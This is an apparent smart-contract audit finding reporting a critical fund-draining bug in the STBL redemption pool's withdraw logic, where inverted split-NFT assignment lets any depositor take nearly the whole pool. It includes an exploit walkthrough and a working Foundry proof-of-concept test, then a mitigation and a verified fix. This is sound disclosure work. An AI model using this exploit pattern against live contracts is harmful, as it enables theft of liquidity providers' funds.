---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-0-0
ingested_at: '2026-07-26T07:14:09Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: Full redemption pool drain via inverted split-piece assignment in `STBL_Redemption_Core.iWithdraw`
vuln_class: []
---

# Full redemption pool drain via inverted split-piece assignment in `STBL_Redemption_Core.iWithdraw`

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_Redemption_Core` is the abstract base contract managing the STBL redemption pool. It custodies a single pooled YLD NFT (`NFTID`) representing all LP deposits, and tracks each LP's proportional stake via `userData[lp].stableValueNet` against a global `totalSupply`. LPs deposit and withdraw shares of this pool; USST stablecoin holders redeem against it.

`STBL_YLD_SplitMerge.split(_tokenId, _splitAssetValue)` returns `(tokenIdA, tokenIdB)` where `tokenIdA.stableValueNet == _splitAssetValue` (the requested amount) and `tokenIdB.stableValueNet == pool_value - _splitAssetValue` (the large remainder).

In `iWithdraw`, after correctly computing and deducting the caller's share, the code sends `_B` (the large remainder) to the caller and sets `NFTID = _A` (the tiny `_amt` slice) — the opposite of the intended behavior stated in `STBL_Redemption.withdraw`'s own NatSpec: *"Splits the pool NFT and transfers the `_amt`-sized piece back to the caller."*

Any LP — any address that has made any nonzero deposit to the pool — can call `withdraw(1)` to receive an NFT worth `pool_value − 1` while the pool retains an NFT worth only 1 unit.

`iRedeem` contains the same inversion: it sets `NFTID = _A` (the small `_amt` slice) and passes `_B` to `iSTBL_Issuer.withdraw`, which would extract nearly the entire pool's underlying assets for a payment of only `_amt` USST

Exploit walkthrough:
```
Pool: NFTID.stableValueNet = 2000, totalSupply = 2000
LP1.stableValueNet = 1000, LP2.stableValueNet = 1000

Attacker deposits 1 unit:
  totalSupply = 2001, attacker.stableValueNet = 1

Attacker calls withdraw(1):
  iFetchShare(attacker) = (1 * 2001) / 2001 = 1  ← check passes
  split(NFTID, 1) → _A (1 unit), _B (2000 units)
  transferFrom(pool → attacker, _B)              ← attacker receives 2000-unit NFT
  NFTID = _A                                     ← pool retains 1-unit NFT

After attack:
  iFetchShare(LP1) = (1000 * 1) / 2001 = 0      ← LP1 permanently locked
  iFetchShare(LP2) = (1000 * 1) / 2001 = 0      ← LP2 permanently locked
```

**Impact:** All LPs are permanently locked, preventing withdrawals.
The loss is total, irreversible, and requires no privileged access or special setup beyond having made any deposit.

**Proof of Concept:** Add the next PoC to `stbl-contracts-evm-redemptions/foundry_test/Redemption.t.sol`
```solidity
    // ─────────────────────────────────────────────────────────────────────
    //  15. PoC — Full pool drain via inverted split-piece assignment
    // ─────────────────────────────────────────────────────────────────────

    /// @notice PoC: Full pool drain via inverted split-piece assignment
    /// Title:    Full pool drain via inverted split-piece assignment in iWithdraw
    /// Affected: STBL_Redemption_Core.sol:154-156
    /// Impact:   Any LP drains the entire pool with a 1-unit withdrawal; all other LPs permanently locked
    /// Author:   0xStalin
    function test_poc_invertedSplitDrainsPool() public {
        address attacker = address(0xDEAD);

        // == [ Setup ] ==

        // LP1 and LP2 each deposit DEPOSIT (10_000e18) underlying tokens
        uint256 nft1 = _issueNFT(user1, DEPOSIT);
        uint256 nft2 = _issueNFT(user2, DEPOSIT);

        YLD_Metadata memory meta1 = yld.getNFTData(nft1);
        YLD_Metadata memory meta2 = yld.getNFTData(nft2);

        vm.startPrank(user1);
        yld.approve(address(redemption), nft1);
        redemption.deposit(nft1);
        vm.stopPrank();

        vm.startPrank(user2);
        yld.approve(address(redemption), nft2);
        redemption.deposit(nft2);
        vm.stopPrank();

        // Fund attacker with 1e18 underlying tokens and issue a tiny NFT
        vm.prank(admin);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mintVal(attacker, 1e18);

        uint256 nftAttacker = _issueNFT(attacker, 1e18);
        YLD_Metadata memory meta_attacker = yld.getNFTData(nftAttacker);

        // Attacker deposits their tiny NFT into the redemption pool
        vm.startPrank(attacker);
        yld.approve(address(redemption), nftAttacker);
        redemption.deposit(nftAttacker);
        vm.stopPrank();

        // == [ Pre-Exploit State ] ==

        uint256 poolValueBefore = yld.getNFTData(redemption.getNFTID()).stableValueNet;

        console.log("--- Pre-Exploit State ---");
        console.log("Pool stableValueNet before attack:", poolValueBefore);
        console.log("LP1 deposited stableValueNet:", meta1.stableValueNet);
        console.log("LP2 deposited stableValueNet:", meta2.stableValueNet);
        console.log("Attacker deposited stableValueNet:", meta_attacker.stableValueNet);

        // == [ Execute Exploit ] ==

        // Snapshot nftCtr before withdraw: split mints _A (nftCtr+1) then _B (nftCtr+2).
        // The attacker receives _B, so their NFT ID is nftCtrBefore + 2.
        uint256 nftCtrBefore = yld.nftCtr();

        // Attacker requests withdrawal of only 1 unit.
        // Due to the inversion in iWithdraw:
        //   split(NFTID, 1) returns (tokenIdA, tokenIdB)
        //   tokenIdA.stableValueNet == 1          <- tiny slice
        //   tokenIdB.stableValueNet == pool - 1   <- nearly everything
        //   YLD.transferFrom(this, attacker, _B)  <- LARGE piece sent to attacker  [BUG]
        //   NFTID = _A                            <- pool keeps only 1 unit         [BUG]
        vm.prank(attacker);
        redemption.withdraw(1);

        uint256 attackerNftId = nftCtrBefore + 2;

        // == [ Verify Impact ] ==

        uint256 poolValueAfter = yld.getNFTData(redemption.getNFTID()).stableValueNet;
        uint256 extractedValue = poolValueBefore - 1;
        uint256 attackerProfit = extractedValue - meta_attacker.stableValueNet;

        console.log("--- Post-Exploit State ---");
        console.log("Pool stableValueNet after attack:", poolValueAfter);
        console.log("Value extracted by attacker (pool_before - 1):", extractedValue);
        console.log("Attacker profit (extracted - own deposit):", attackerProfit);
        console.log("Attacker NFT stableValueNet:", yld.getNFTData(attackerNftId).stableValueNet);

        // Pool retains only 1 unit of stableValueNet
        assertEq(
            yld.getNFTData(redemption.getNFTID()).stableValueNet,
            1,
            "pool retains only 1 unit after drain"
        );

        // Attacker received exactly 1 NFT containing nearly all pool value
        assertEq(
            yld.balanceOf(attacker),
            1,
            "attacker holds exactly 1 NFT containing nearly all pool value"
        );
        assertEq(yld.ownerOf(attackerNftId), attacker, "attacker owns the drained NFT");

        // Attacker extracted more value than they deposited — net profit
        assertGt(
            poolValueBefore - 1,
            meta_attacker.stableValueNet,
            "attacker extracted more than they deposited"
        );

        // Attacker net profit: extracted - own deposit
        assertGt(attackerProfit, 0, "attacker profit is positive");

        // LP1 is permanently locked: iFetchShare floors to zero because pool only has 1 unit
        // but totalSupply still accounts for LP1's full deposit, so
        // iFetchShare(user1) = (meta1.stableValueNet * 1) / totalSupply ≈ 0
        vm.prank(user1);
        vm.expectRevert(STBL_InvalidAmount.selector);
        redemption.withdraw(1);

        // LP2 is equally locked for the same reason
        vm.prank(user2);
        vm.expectRevert(STBL_InvalidAmount.selector);
        redemption.withdraw(1);

        console.log("[+] EXPLOIT CONFIRMED: Attacker drained the pool with a 1-unit withdrawal request");
        console.log("[+] LP1 and LP2 are permanently locked - iFetchShare floors to zero");
    }
```

**Recommended Mitigation:** In `iWithdraw` (`STBL_Redemption_Core.sol:155-156`), swap the A/B assignment so the caller receives the `_amt`-sized piece (`_A`) and the pool retains the remainder (`_B`).

**STBL:** Fixed in commit [3300d4c](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-redemptions/commit/3300d4cea4d586ba55166e17fa9f279a48544288).

**Cyfrin:** Verified.  Pool now keeps NFT_B and transfers NFT_A to the withdrawer.
